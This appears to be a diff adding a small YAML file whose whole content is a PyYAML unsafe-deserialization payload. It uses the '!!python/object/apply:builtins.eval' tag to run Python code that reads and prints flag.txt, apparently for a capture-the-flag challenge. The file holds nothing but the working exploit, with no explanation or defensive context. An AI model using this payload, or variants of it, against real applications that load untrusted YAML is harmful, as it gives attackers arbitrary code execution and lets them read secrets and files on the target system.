@@ -1,0 +1,5 @@
+!!python/object/apply:builtins.eval
+args: 
+  - 'print(open("flag.txt", "r").read())'
+
+  
